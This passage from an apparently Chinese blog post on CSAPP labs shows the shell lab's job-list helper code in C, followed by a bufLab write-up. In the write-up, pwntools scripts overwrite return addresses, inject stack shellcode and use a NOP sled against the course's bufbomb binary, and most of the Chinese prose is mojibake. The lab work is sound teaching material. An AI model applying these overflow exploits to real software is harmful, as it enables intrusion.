The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     currently running children to terminate.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    to the foreground job.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*</span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*********************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * End signal handlers</span></span><br><span class="hljs-comment"><span class="hljs-function"> *********************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/***********************************************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * Helper routines that manipulate the job list</span></span><br><span class="hljs-comment"><span class="hljs-function"> **********************************************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span><br><span class="hljs-function"></span>&#123;<br>    job-&gt;pid = <span class="hljs-number">0</span>;<br>    job-&gt;jid = <span class="hljs-number">0</span>;<br>    job-&gt;state = UNDEF;<br>    job-&gt;cmdline[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* initjobs - Initialize the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        clearjob(&amp;jobs[i]);<br>&#125;<br><br><span class="hljs-comment">/* maxjid - Returns largest allocated job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, max = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].jid &gt; max)<br>            max = jobs[i].jid;<br>    <span class="hljs-keyword">return</span> max;<br>&#125;<br><br><span class="hljs-comment">/* addjob - Add a job to the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == <span class="hljs-number">0</span>)<br>        &#123;<br>            jobs[i].pid = pid;<br>            jobs[i].state = state;<br>            jobs[i].jid = nextjid++;<br>            <span class="hljs-keyword">if</span> (nextjid &gt; MAXJOBS)<br>                nextjid = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">strcpy</span>(jobs[i].cmdline, cmdline);<br>            <span class="hljs-keyword">if</span> (verbose)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tried to create too many jobs\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* deletejob - Delete a job whose PID=pid from the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        &#123;<br>            clearjob(&amp;jobs[i]);<br>            nextjid = maxjid(jobs) + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].state == FG)<br>            <span class="hljs-keyword">return</span> jobs[i].pid;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobpid  - Find a job (by PID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>            <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobjid  - Find a job (by JID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (jid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].jid == jid)<br>            <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* pid2jid - Map process ID to job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        &#123;<br>            <span class="hljs-keyword">return</span> jobs[i].jid;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* listjobs - Print the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);<br>            <span class="hljs-keyword">switch</span> (jobs[i].state)<br>            &#123;<br>            <span class="hljs-keyword">case</span> BG:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Running &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> FG:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Foreground &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> ST:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stopped &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>,<br>                       i, jobs[i].state);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, jobs[i].cmdline);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/******************************</span><br><span class="hljs-comment"> * end job list helper routines</span><br><span class="hljs-comment"> ******************************/</span><br><br><span class="hljs-comment">/***********************</span><br><span class="hljs-comment"> * Other helper routines</span><br><span class="hljs-comment"> ***********************/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * usage - print a help message</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: shell [-hvp]\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -h   print this message\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -v   print additional diagnostic information\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -p   do not emit a command prompt\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * unix_error - unix-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * app_error - application-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Signal - wrapper for the sigaction function</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">action</span>, <span class="hljs-title">old_action</span>;</span><br><br>    action.sa_handler = handler;<br>    sigemptyset(&amp;action.sa_mask); <span class="hljs-comment">/* block sigs of type being handled */</span><br>    action.sa_flags = SA_RESTART; <span class="hljs-comment">/* restart syscalls if possible */</span><br><br>    <span class="hljs-keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Signal error&quot;</span>);<br>    <span class="hljs-keyword">return</span> (old_action.sa_handler);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigquit_handler - The driver program can gracefully terminate the</span><br><span class="hljs-comment"> *    child shell by sending it a SIGQUIT signal.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="å®éªŒæ€»ç»“"><a href="#å®éªŒæ€»ç»“" class="headerlink" title="å®éªŒæ€»ç»“"></a>å®éªŒæ€»ç»“</h3><p>æ€»çš„æ¥è¯´ä¸éš¾çš„ä¸€ä¸ªå®éªŒï¼Œå…³é”®åœ¨äºè¦å…ˆç†è§£æ•´ä¸ªæ¡†æ¶ä¸­çš„ä»£ç ï¼Œç„¶åæ ¹æ®trace fileæ¸è¿›åœ°å®Œæˆç¨‹åºã€‚éœ€è¦æ³¨æ„çš„åœ°æ–¹å®éªŒè®²ä¹‰ä¸­çš„æç¤ºä»¥åŠä¹¦æœ¬ä¸­éƒ½å·²ç»ç»™å‡ºï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚éœ€è¦å¼ºè°ƒçš„æ˜¯SIGCHLDçš„ä¿¡å·å¤„ç†ç¨‹åºéœ€è¦å¤„ç†æœªæ•è·çš„SIGTSTPå’ŒSIGINTä¿¡å·ã€‚æ­¤å¤–SIGINT/SIGTSTPå’ŒSIGCHLDçš„ä¿¡å·å¤„ç†ç¨‹åºä¹‹é—´å¯èƒ½ä¼šæœ‰æ½œåœ¨çš„å¯¼è‡´é”™è¯¯çš„å†²çªã€‚ï¼ˆä¿¡å·å¤„ç†ç¨‹åºæ˜¯å¯ä»¥è¢«å…¶ä»–ä¿¡å·ä¸­æ–­çš„ï¼Œå¯ä»¥è§trace16.txtï¼‰</p><h2 id="bufLab"><a href="#bufLab" class="headerlink" title="bufLab"></a>bufLab</h2><p>ctf pwn buffer overflowåŸºç¡€å…¥é—¨é¢˜ç›®.</p><h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>ç”±äºbufbombæ²¡æœ‰å¼€PIE, æ‰€ä»¥smokeçš„åœ°å€æ˜¯å›ºå®šçš„, åªè¦è¦†ç›–è¿”å›åœ°å€å°±è¡Œ.</p><p>smoke() address: 0x08048E0A</p><img src="../../image/buflab/image-20220501205056212.png" alt="image-20220501205056212" style="zoom:80%;" /><p>getbufæ²¡æœ‰å¼€canary, æ‰€ä»¥å¡«å……å®Œ0x28å­—èŠ‚+8bytes rbp+0x08048E0Aå³å¯.</p><p>ç„¶åçªç„¶å‘ç°æœ«å°¾æœ‰ä¸ª0a, äºæ˜¯æ¢æˆ10, ä¹Ÿå°±æ˜¯smokeç¬¬ä¸‰æ¡æŒ‡ä»¤çš„ä½ç½®, è·³è¿‡äº†å¼€è¾Ÿå ç©ºé—´çš„è¿‡ç¨‹ä¸è¿‡è¿™å‡½æ•°ç›´æ¥é€€å‡ºä¹Ÿæ²¡å•¥å…³ç³».</p><img src="../../image/buflab/image-20220501211931466.png" alt="image-20220501211931466" style="zoom:80%;" /><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&quot;import pwn,sys;sys.stdout.buffer.write(b&#x27;b&#x27;*(0x28+0x4)+pwn.p32(0x08048E10))&quot;</span> &gt;input</span><br><span class="hljs-meta">$</span><span class="bash"> ./bufbomb -u yogdzewa &lt;input</span><br></code></pre></div></td></tr></table></figure><img src="../../image/buflab/image-20220501211857203.png" alt="image-20220501211857203" style="zoom:80%;" /><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>è¦è°ƒç”¨fizzå‡½æ•°, å‚æ•°è¦ç­‰äº<code>cookie = 0x24692446</code>.</p><p>æ‰€ä»¥gefbufè¿”å›åè·³åˆ°fizz, æ ˆåº•æ˜¯è¿”å›åœ°å€, å†å¾€ä¸‹æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&quot;import pwn,sys;sys.stdout.buffer.write(b&#x27;b&#x27;*(0x28+0x4)+pwn.p32(0x08048DAF)+pwn.p32(0)+pwn.p32(0x24692446))&quot;</span> &gt;input</span> <br><span class="hljs-meta">$</span><span class="bash"> ./bufbomb -u yogdzewa &lt;input</span><br></code></pre></div></td></tr></table></figure><p><img src="../../image/CSAPP_Lab/image-20220501213601163.png" alt="image-20220501213601163"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>shellcodeæ³¨å…¥, æ”¾åˆ°æ ˆä¸Šæ‰§è¡Œ, éœ€è¦ä¿®æ”¹ä¸€ä¸ªbssæ®µçš„å…¨å±€å˜é‡. å¦‚å›¾: <img src="../../image/buflab/image-20220501214313652.png" alt="image-20220501214313652" style="zoom:80%;" /></p><p>åœ¨åœ°å€0x0804D10Cå¤„. æ ˆçš„åŸºåœ°å€æ˜¯æ ¹æ®cookieæ¥ç¡®å®šçš„, ä¸è¿‡åœ¨æ¯æ¬¡è¿è¡Œä¸­éƒ½ä¸ä¼šå˜.</p><p>bang() address: <code>0x08048D52</code>, getbuf stack frame base: ebp -&gt; <code>0x55683c60</code>, getbufâ€™s buf: ebp-0x28=<code>0x55683C38</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;./bufbomb&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edi, 0x0804D10C</span><br><span class="hljs-string">mov [edi], dword ptr 0x24692446</span><br><span class="hljs-string">mov eax, 0x08048D52</span><br><span class="hljs-string">jmp eax#é—´æ¥è·³è½¬ä¹Ÿæ˜¯å¯ä»¥çš„, è¿™ä¸ªæ˜¯ç»å¯¹åœ°å€ç¼–ç </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-comment">#18bytes long</span><br>tmp = asm(shellcode).ljust(<span class="hljs-number">40</span>) <span class="hljs-comment">#ä¸ºäº†å¡«æ»¡buf</span><br>pl = tmp+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x55683C38</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>o.write(pl)<br></code></pre></div></td></tr></table></figure><p>å®Œæˆ.</p><img src="../../image/buflab/image-20220501221133428.png" alt="image-20220501221133428" style="zoom: 80%;" /><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>getbuf stack frame base: ebp -&gt; <code>0x55683c60</code>, getbufâ€™s buf: ebp-0x28=<code>0x55683C38</code> </p><p>åœ¨getbufè¿”å›çš„æ—¶å€™è·³è½¬åˆ°shellcode, ä¿®æ”¹eaxä¸ºcookie. è¿™ä¸ªæ—¶å€™å¦‚æœè¦æ‰§è¡ŒretæŒ‡ä»¤, å¿…é¡»å…ˆåœ¨æ ˆä¸Šå‹å…¥åŸå…ˆçš„è¿”å›åœ°å€, å³<code>0x08048E50</code>, è¿™æ ·å°±è¡Œäº†. å¦‚æœç›´æ¥ä½¿ç”¨é—´æ¥è·³è½¬éƒ½ä¸ç”¨å‹å…¥è¿™ä¸ª. </p><p>ä¸è¿‡è¿™æ ·åœ¨è¿”å›testçš„æ—¶å€™ebpè¢«ç ´åäº†, ä¸è¿‡åæ­£æ ˆæ²¡æœ‰å˜åŒ–, gdbæŸ¥å¾—å€¼ä¸º<code>0x55683c90</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;./bufbomb&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov eax, 0x24692446</span><br><span class="hljs-string">mov ecx, 0x08048E50</span><br><span class="hljs-string">jmp ecx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>tmp = asm(shellcode).ljust(<span class="hljs-number">40</span>) <span class="hljs-comment">#ä¸ºäº†å¡«æ»¡buf</span><br>pl = tmp+p32(<span class="hljs-number">0x55683c90</span>)+p32(<span class="hljs-number">0x55683C38</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>o.write(pl)<br></code></pre></div></td></tr></table></figure><p>å®Œæˆ.</p><img src="../../image/buflab/image-20220501222518773.png" alt="image-20220501222518773" style="zoom:80%;" /><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>ç®€å•æ¥è¯´å°±æ˜¯è°ƒç”¨ä¸€ä¸ªæ–°å‡½æ•°<code>getbufn()</code>, å…¶ä¸­bufæœ‰520å­—èŠ‚, ä¸è¿‡ç”±äºè°ƒç”¨ä¹‹å‰ä¼šéšæœºåœ¨æ ˆä¸Šåˆ†é…ä¸€äº›ç©ºé—´, æ‰€ä»¥ebpçš„å€¼ä¼šå‘ç”Ÿæ”¹å˜, ä¸ºÂ±240. æ‰€ä»¥åœ¨äº”æ¬¡è¿è¡ŒæœŸé—´è¦ä¿è¯getbufnè·³è½¬åˆ°åˆé€‚çš„ä½ç½®. </p><p>æ‰€ä»¥ç›´æ¥ä½¿ç”¨nop sledæŠ€æœ¯. </p><p>getbuf stack frame base: ebp -&gt; <code>0x55683c60</code>, æœ€å¤šå‡å»240, å³<code>0x55683B70</code> </p><p>ç”±äºè¦è¿”å›åˆ°testnä¸”å¤šæ¬¡æ‰§è¡Œ, è¿™æ ·ebpå¿…é¡»ä¿è¯å…¶ä¸è¢«ç ´å, æ–¹æ³•æ˜¯åˆ©ç”¨espå’Œebpçš„å…³ç³»æ¥åœ¨shellcodeè®¡ç®—å‡ºæ¥.</p><p>ä»getbufnè¿”å›çš„æ—¶å€™espæ˜¯testnçš„æ ˆé¡¶. è€Œtestnçš„espå’Œebpçš„å…³ç³»æ˜¯<code>ebp = esp + 0x28</code>.</p><img src="../../image/buflab/image-20220501233825396.png" alt="image-20220501233825396" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;./bufbomb&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lea ebp, [esp+0x28]</span><br><span class="hljs-string">mov eax, 0x24692446</span><br><span class="hljs-string">mov ecx, 0x08048CE2</span><br><span class="hljs-string">jmp ecx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>tmp = asm(shellcode).rjust(<span class="hljs-number">520</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>) <span class="hljs-comment">#nop sled</span><br>pl = tmp+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x55683B70f</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>o.write(pl)<br></code></pre></div></td></tr></table></figure><p>å®Œæˆ.</p><img src="../../image/buflab/image-20220501233537565.png" alt="image-20220501233537565" style="zoom:80%;" /><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™æ¬¡å®éªŒå¼•å¯¼å¦‚ä½•åˆ©ç”¨ç¼“å†²åŒºå­˜åœ¨çš„æ¼æ´å®ç°ä¸€äº›ç›®çš„ï¼š</p><ol><li>Level0ï¼šåˆ©ç”¨ç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œåœ¨è°ƒç”¨å‡½æ•°getbufæ—¶ç›´æ¥è¿”å›smokeå‡½æ•°ï¼Œè®©æˆ‘ä»¬åˆæ­¥è®¤è¯†ç¼“å†²åŒºæº¢å‡ºæ”»å‡»çš„åŸç†ã€‚</li><li>Level1ï¼šåœ¨Level0çš„åŸºç¡€ä¸Šï¼Œå¤šäº†ä¿®æ”¹å‡½æ•°å‚æ•°çš„æ“ä½œï¼Œè¿™éœ€è¦æˆ‘ä»¬ç»“åˆæ±‡ç¼–ä»£ç æ‰¾åˆ°å‚æ•°çš„ä½ç½®ã€‚</li><li>Level2ï¼šå¼€å§‹éœ€è¦æˆ‘ä»¬è‡ªå·±ç¼–å†™æ±‡ç¼–ä»£ç æ®µå»å®ç°æ“ä½œï¼šä¿®æ”¹è¿”å›å€¼ã€è®¾ç½®å…¨å±€å˜é‡ã€è·³è½¬ã€‚åŒæ—¶ä¹Ÿéœ€è¦åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºï¼Œè·³è½¬è‡³è¿™æ®µä»£ç 